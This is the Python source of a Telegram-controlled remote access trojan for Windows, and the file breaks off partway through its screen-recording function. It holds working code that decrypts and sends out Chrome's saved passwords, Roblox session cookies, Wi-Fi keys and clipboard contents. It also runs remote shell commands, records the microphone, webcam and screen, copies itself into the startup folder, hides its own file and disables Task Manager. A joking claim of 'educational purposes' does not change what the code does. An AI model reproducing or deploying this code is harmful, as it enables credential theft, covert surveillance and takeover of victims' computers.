#licensed by Shamil :)
import telebot
import os
import random
import pyttsx3
import pyautogui
import cv2
import json
import ctypes
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import time
import pyaudio
import wave
import browser_cookie3
import numpy as np
import shutil
from datetime import timezone, datetime, timedelta
try:
    bot = telebot.TeleBot('your_api_token')
except Exception as e:
    pass
#################################################################################
textovik = """You can use:
        ⚔️/start - start the program
        ⚙️/help - help with commands
        🔌/addstartup - to add autostart
        🧑🏻‍💻/users - show users in pc
        🔑/passwords - show saved passwords in pc
        🍪/robloxcookie - show roblox cookies
        🪪/info - to show information about pc ,also location , country, city , ip
        🖥️/whoami - to show name of pc
        💬👂🏻/textspech 'your text' - your text will sounded in pc
        🎵/playsound 'file path' -(first run /upload to upload your music file in pc) your file will sound in pc for ex: /playsound C:\\test.mp3
        🔫/execute - execute shell commands (like terminel emulator in netcat)
        🗡️/e 'your command' - also execute shell commands
        🏹/ex 'your command' - use this if you will execute commands with long response 
        📷/screenshot - to get screenshot
        📹/webscreen - get screenshot from camera
        🎙️/mic 'time in seconds' - record microphone of pc
        ☢️/winblocker - my own winlocker
        ☣️/winblocker2 - if winblocker doesnt work
        📁/download 'your file' - to download files(for exm: /download C:\\test.txt)
        🗃️/upload - to upload file in target pc
        📋/clipboard - show users clipboard
        🎦/webcam - get webcam video
        🎥/screenrecord - get screenrecord
        🌐/chrome 'website url' - open website in chrome in target pc
        🌐/edge 'website url' - open website in edge in target pc
        🌐/firefox 'website url' - open website in firefox in target pc             
        Ⓜ️/msg 'your message' - send message(messagebox) to target
        💣/spam 'your message' - spam your message 10 times but if you will click al lot...
        🛜/wifilist - show saved wifi
        🔐/wifipass 'name of accespoint' - show password of saved wifi
        🖱️/mousemesstart - start mouse messing
        🐁/mousemesstop - stop mouse messing
        🪤/mousekill - disable mouse
        🐭/mousestop - enable mouse
        🔊/fullvolume - make full volume
        🔉/volumeplus - make pc volume + 10
        🔇/volumeminus - make pc volume - 10
        🪦/disabletaskmgr - disable task manager
        📠/enabletaskmgr - enable task manager
        🧱/wallpaper - change desktop's wallpaper
        ⌨️/keypress 'your key' - in pc's keyboard will pressed this keys 
        ⌨️/keypresstwo 'your key' 'your key' - in pc's keyboard will pressed this keys 
        ⌨️/keypresstthree 'your key' 'your key' 'your key' - in pc's keyboard will pressed this keys 
        📃/tasklist - to show tasks
        🧨/taskkill 'your task' - kill entered task
        🕶️/hide - to hide your app
        👓/unhide - unhide your app
        💤/sleep - send windows to sleep
        🕚/shutdown - shutdown pc
        🔄️/restart - restart pc
        """
n = False

@bot.message_handler(commands=['start'])

def start(message):
    
    if n == False:
        bot.send_message(message.chat.id, "Enter password:")
        bot.register_next_step_handler(message, checkpass)
    else:
            bot.send_message(message.chat.id, "Connection!")
            if message.from_user.last_name == None:
                bot.send_message(message.chat.id, f'Salam aleykum, {message.from_user.first_name}! I promise you will use this only for educational purposes :)')
            else:
                bot.send_message(message.chat.id, f'Salam aleykum ,{message.from_user.first_name} {message.from_user.last_name}! I promise you will use this only for educational purposes :)')
            result = os.popen('whoami').read().strip()
            bot.send_message(message.chat.id, f'You can use /help')
            bot.send_message(message.chat.id, f'Pc name is: {result}')
def checkpass(message):
        if message.text == 'MomentoMori':
            global n
            n = True
            bot.send_message(message.chat.id, 'Logged succesfuly!')
            bot.send_message(message.chat.id, "Connection!")
            if message.from_user.last_name == None:
                bot.send_message(message.chat.id, f'Salam aleykum, {message.from_user.first_name}! I promise you will use this only for educational purposes :)')
            else:
                bot.send_message(message.chat.id, f'Salam aleykum ,{message.from_user.first_name} {message.from_user.last_name}! I promise you will use this only for educational purposes :)')
            result = os.popen('whoami').read().strip()
            bot.send_message(message.chat.id, f'You can use /help')
            bot.send_message(message.chat.id, f'Pc name is: {result}')
        else:
            bot.send_message(message.chat.id, 'password is wrong')
#################################################################################    
user_state = {}

@bot.message_handler(commands=['addstartup'])
def add_startup(message):
    bot.send_message(message.chat.id, 'Enter name of your exe file')
    user_state[message.chat.id] = 'waiting_for_path'

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == 'waiting_for_path')
def handle_executable_path(message):
    executable_path = message.text
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    
    if os.path.isdir(startup_folder):
        executable_filename = os.path.basename(executable_path)
        destination_path = os.path.join(startup_folder, executable_filename)
        shutil.copyfile(executable_path, destination_path)
        bot.send_message(message.chat.id, f'{executable_filename} added to startup successfully!')
    else:
        bot.send_message(message.chat.id, 'Startup folder not found')
    
    user_state[message.chat.id] = None

#################################################################################
@bot.message_handler(commands=['robloxcookie'])
def robloxl(message):
    data = [] 

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')    
        for cookie in cookies:
            bot.send_message(message.chat.id , cookie)

            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                global li
                global la
                li = cookie.name
                la = cookie.value

                

    except Exception as e:
            bot.send_message(message.chat.id , f'Error:{e}')
  
   
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')    
        for cookie in cookies:
            bot.send_message(message.chat.id ,cookie)
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                print("L")
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    
    try:
        bot.send_message(message.chat.id , f'security_cookie_name:{li}')
        bot.send_message(message.chat.id , f'security_cookie_value:{la}')
    except Exception as e:
        bot.send_document(message.chat.id, f'Error:{e}')
    try:
        with open("all_roblox_cookie.txt", "w", encoding="utf-8") as file:
            file.write(str(data))


        with open("all_roblox_cookie.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
    except Exception as e:
        bot.send_document(message.chat.id, f'Error:{e}')

    try:
        os.remove('all_roblox_cookie.txt')
    except Exception as e:
        bot.send_document(message.chat.id, f'Error:{e}')        
#################################################################################
@bot.message_handler(commands=['passwords'])
def send_passwords(message):

    bot.send_message(message.chat.id, "Catching passwords...")


    key = get_encryption_key()


    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)


    db = sqlite3.connect(filename)
    cursor = db.cursor()


    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        

        
        if username or password:
            bot.send_message(message.chat.id, f"Origin URL: {origin_url}")
            bot.send_message(message.chat.id, f"Action URL: {action_url}")
            bot.send_message(message.chat.id, f"Username: {username}")
            bot.send_message(message.chat.id, f"Password: {password}")
        else:
            continue

        if date_created != 86400000000 and date_created:
            bot.send_message(message.chat.id, f"Creation date: {str(get_chrome_datetime(date_created))}")

        if date_last_used != 86400000000 and date_last_used:
            bot.send_message(message.chat.id, f"Last Used: {str(get_chrome_datetime(date_last_used))}")

        bot.send_message(message.chat.id, "=" * 50)

###################################################################


    data_to_send = ""

    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")


    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        


        if username or password:
            data_to_send += f"Origin URL: {origin_url}\n"
            data_to_send += f"Action URL: {action_url}\n"
            data_to_send += f"Username: {username}\n"
            data_to_send += f"Password: {password}\n"

        if date_created != 86400000000 and date_created:
            data_to_send += f"Creation date: {str(get_chrome_datetime(date_created))}\n"

        if date_last_used != 86400000000 and date_last_used:
            data_to_send += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"

        data_to_send += "=" * 50 + "\n\n"



    cursor.close()
    db.close()


    try:
        os.remove(filename)
    except Exception as e:
        print(f"Error while deleting file: {e}")


    if data_to_send:
        with open("passwords.txt", "w", encoding="utf-8") as file:
            file.write(data_to_send)


        with open("passwords.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
    
    else:
        bot.send_message(message.chat.id, "There is no passwordds to send them.")
    os.remove('passwords.txt')
###################################################################


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
#############################################################################

@bot.message_handler(commands=['taskkill'])
def task_kill(message):

    try:
        task = message.text.split('/taskkill', 1)[1].strip()
        ss = os.popen(f'taskkill /f /im {task}').read().strip()
        bot.send_message(message.chat.id , f'{ss}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')


#############################################################################


@bot.message_handler(commands=['clipboard'])
def get_clipboard_content(message):
    usid = message.from_user.id
    clientid = message.chat.id
    
    if usid == clientid:
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32 = ctypes.windll.user32
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            body = value.decode()
            user32.CloseClipboard()
            username = os.getlogin()
            bot.send_message(message.chat.id , f'{username} \'s clipboard is : {body}')


#############################################################################s
global mousekill
mousekill = 42


 
@bot.message_handler(commands=['mousestop'])
def mou(message):
    global mousekill
    mousekill = 7
    bot.send_message(message.chat.id , 'mouse kill has stopped!')
 


#############################################################################
 
@bot.message_handler(commands=['mousekill'])
def mous(message):

    try:
        bot.send_message(message.chat.id , 'mouse kill has started!')

        while mousekill != 7:
            pyautogui.moveTo(500,500)
            #time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################

global mousemess
mousemess = 42

#############################################################################
 
@bot.message_handler(commands=['mousemesstop'])
def moust(message):
    global mousemess
    mousemess = 7
    bot.send_message(message.chat.id , 'mouse mess has stopped!')
 
 

#############################################################################
 
@bot.message_handler(commands=['mousemesstart'])
def mous(message):

    try:
        bot.send_message(message.chat.id , 'mouse mess has started!')

        while mousemess != 7:
            x=random.randint(666, 999)
            y=random.randint(666, 999)
            pyautogui.moveTo(x, y, 7)
            time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################

@bot.message_handler(commands=['keypress'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:

        bot.send_message(message.chat.id , '(/keypress win) You can use this keys:')
        bot.send_message(message.chat.id , str(keys))

        keypr = message.text.split('/keypress', 1)[1].strip()
        pyautogui.press(keypr) 
        bot.send_message(message.chat.id , f'\'{keypr}\'  key has pressed succesfuly!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  


#############################################################################        




@bot.message_handler(commands=['keypresstwo'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:

        bot.send_message(message.chat.id , '(/keypresstwo win r) You can use this keys:')
        bot.send_message(message.chat.id , str(keys))

        keypwo = message.text.split('/keypresstwo', 1)[1].strip().split()
        key1 = keypwo[0]
        
        key2 = keypwo[1]

        pyautogui.hotkey(key1, key2)
        bot.send_message(message.chat.id , f'key has pressed succesfuly!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  
        
#############################################################################        


@bot.message_handler(commands=['keypressthree'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:
        bot.send_message(message.chat.id , '(/keypressthree ctrl alt esc) You can use this keys:')
        bot.send_message(message.chat.id , str(keys))

        keypwo = message.text.split('/keypressthree', 1)[1].strip().split()
        key1 = keypwo[0]
        
        key2 = keypwo[1]
        
        key3 = keypwo[2]

    
        pyautogui.hotkey(key1, key2 , key3)
        bot.send_message(message.chat.id , f'key has pressed succesfuly!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  
        
        
#############################################################################

                
@bot.message_handler(commands=['disabletaskmgr'])
def disabtsk(message):       
    try:
        disable_command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
        os.popen(disable_command)
        bot.send_message(message.chat.id , 'taskmanager disabled!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
        
               
        
#############################################################################

                
@bot.message_handler(commands=['enabletaskmgr'])
def disabtsk(message):       
    try:
        enable_command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
        os.popen(enable_command)
        bot.send_message(message.chat.id , 'taskmanager enabled!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
                
        
      
#############################################################################       
@bot.message_handler(commands=['wifilist'])
def wifipassword(message):
    
    a = os.popen('netsh wlan show profile').read().strip()
    bot.send_message(message.chat.id , f'Wifi networks📶:{a}')

################################

@bot.message_handler(commands=['wifipass'])
def wifipassword(message):
    name = message.text.split('/wifipass', 1)[1].strip()
    results = os.popen(f'netsh wlan show profile name={name} key=clear').read().strip()

    try:
        bot.send_message(message.chat.id ,str(results))
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")


#############################################################################      
@bot.message_handler(commands=['users'])
def users(message):
    
    try:
        com = os.popen('net user').read().strip()
        bot.send_message(message.chat.id, f'Res:{com}')
 
        bot.send_message(message.chat.id, '####################################')
        
        cm = os.popen('wmic useraccount list brief').read().strip()
        bot.send_message(message.chat.id, f'Also:{cm}')
    
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')

#############################################################################      
@bot.message_handler(commands=['hide'])
def hide(message):
    
    try:
        path = os.getcwd()

        name = os.path.basename(__file__)

        full_path = path + '\\'+ name

        bot.send_message(message.chat.id ,f'Full path:{full_path}')

        os.popen(f'attrib +h \"{full_path}\"')
    
        bot.send_message(message.chat.id ,f'your app is hidden!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')
#############################################################################      

@bot.message_handler(commands=['unhide'])
def unhide(message):
    
    try:
        path = os.getcwd()

        name = os.path.basename(__file__)

        full_path = path + '\\'+ name

        bot.send_message(message.chat.id ,f'Full path:{full_path}')

        os.popen(f'attrib -h \"{full_path}\"')
    
        bot.send_message(message.chat.id ,f'your app is unhidden!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')


#############################################################################
@bot.message_handler(commands=['mic'])
def record_audio(message):
    if len(message.text.split()) > 1:
        try:
            record_time = int(message.text.split()[1]) 
        except ValueError:
            bot.reply_to(message, "Invalid record time. Please enter a valid number.")
            return
    else:
        record_time = 5

    
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    WAVE_OUTPUT_FILENAME = "6425s-3erq-eq44-vcx7.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    bot.send_message(message.chat.id, f"Recording audio for {record_time} seconds...")

    frames = []

    for i in range(0, int(RATE / CHUNK * record_time)):
        data = stream.read(CHUNK)
        frames.append(data)

    bot.send_message(message.chat.id, "Done recording")

    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)

    os.remove(WAVE_OUTPUT_FILENAME)

###################################################################
@bot.message_handler(commands=['msg'])
def msg(message):
    try:
        mesaj = message.text.split('/msg', 1)[1].strip()
        os.popen(f'msg * {mesaj}')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')
    
#############################################################################
@bot.message_handler(commands=['spam'])
def msg(message):
    mesaj = message.text.split('/spam', 1)[1].strip()
    try:
        n = 0
        while n != 10:
            n = n + 1
            os.popen(f'msg * {mesaj}')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################


   
waiting_for_upload = False     


@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    global waiting_for_upload
    waiting_for_upload = True
    bot.send_message(message.chat.id, "Please send your file:")

@bot.message_handler(content_types=['document', 'photo', 'audio', 'video', 'voice'])
def handle_file(message):
    global waiting_for_upload
    if waiting_for_upload:
        try:
            file_name = message.document.file_name if message.document else message.photo.file_name
            file_info = bot.get_file(message.document.file_id) if message.document else bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as new_file:
                new_file.write(downloaded_file)
            directory = os.getcwd() 
            bot.send_message(message.chat.id, f'File has been sent successfully in: {directory}')
            waiting_for_upload = False
        except Exception as e:
            bot.send_message(message.chat.id, f'Error: {e}')
    else:
        bot.send_message(message.chat.id, 'Please enter the /upload command first')

#############################################################################

@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):
    
    bot.send_message(message.chat.id, "First run /upload and upload picture")

    bot.send_message(message.chat.id, "Then send name of photo to change desktop's wallpaper:")
    bot.register_next_step_handler(message, wall)
    
def wall(message):
    filename = message.text

    if not filename.startswith('/'):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(str(filename)), 0)
            bot.send_message(message.chat.id, "Desktop's wallpaper succesfuly changed!")
    
        except Exception as e:
            bot.send_message(message.chat.id, f'Error{e}')


#############################################################################
@bot.message_handler(commands=['download'])

def download_file(message):
    download_file = message.text.split('/download', 1)[1].strip()
    try:      
        with open(download_file , 'rb') as file:
            if str(download_file[-3:]) == 'png':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'jpg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'svg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'jpeg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'mkv':
                bot.send_video(message.chat.id, file , timeout=100)
            else:
                bot.send_document(message.chat.id, file)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')

#############################################################################
@bot.message_handler(commands=['fullvolume'])

def volp(message):
    try:
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        bot.send_message(message.chat.id, 'succesfuly full!')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['volumeplus'])

def volp(message):
    try:
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        bot.send_message(message.chat.id, 'succesfuly +10')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['volumeminus'])

def volm(message):
    try:
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        bot.send_message(message.chat.id, 'succesfuly -10')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['webcam'])

def camsw(message):
    bot.send_message(message.chat.id , 'Switch the camera (0 is default camera)')
    msg = bot.send_message(message.chat.id , 'Enter 0, 1, or another index:')
    bot.register_next_step_handler(msg, lambda msg: camv(msg, int(msg.text)))

def camv(message, camera_index):
    msg = bot.send_message(message.chat.id , 'Enter record time:')
    bot.register_next_step_handler(msg, lambda msg: camer(msg, camera_index, int(msg.text)))

def camer(message, camera_index, record_time):
    bot.send_message(message.chat.id , 'Please wait...')
    cap = cv2.VideoCapture(camera_index)

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_file = '498j-33v1-9d24-z390.mkv'
    output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))

    start_time = time.time()

    while True:
        ret, frame = cap.read()
        if ret:
            output_v.write(frame)
            if time.time() - start_time > record_time:
                break
        else:
            break

    cap.release()
    output_v.release()
    cv2.destroyAllWindows()

    try:
        with open(output_file, 'rb') as video_file:
            bot.send_document(message.chat.id, video_file, timeout=122)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')

    os.remove('498j-33v1-9d24-z390.mkv')
#############################################################################
@bot.message_handler(commands=['help'])

def help(message):
    if n == False:
        bot.send_message(message.chat.id, "Enter password:")
        bot.register_next_step_handler(message, checkpasswd)
    else:
        bot.send_message(message.chat.id,textovik)
def checkpasswd(message):
    if message.text == 'MomentoMori':
        global n
        n = True
        bot.send_message(message.chat.id, 'Logged succesfuly!')
        bot.send_message(message.chat.id, textovik)
    else:
        bot.send_message(message.chat.id, 'password is wrong')

#################################################################################

@bot.message_handler(commands=['textspech'])
def screen(message):
    try:
        text = message.text.split('/textspech', 1)[1].strip()
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        bot.send_message(message.chat.id , f'{text}  sended succesfuly!')

    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')
#################################################################################
@bot.message_handler(commands=['screenrecord'])
def screen(message):
    
    msg = bot.send_message(message.chat.id , 'Enter record time:')
    bot.register_next_step_handler(msg, scr)
def scr(message):
    bot.send_message(message.chat.id , 'Please wait...')
    screen_width, screen_height = pyautogui.size()

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_video = cv2.VideoWriter('498j-33v1-9d24-z390.mkv', fourcc, 10.0, (screen_width, screen_height))


    start_time = time.time()

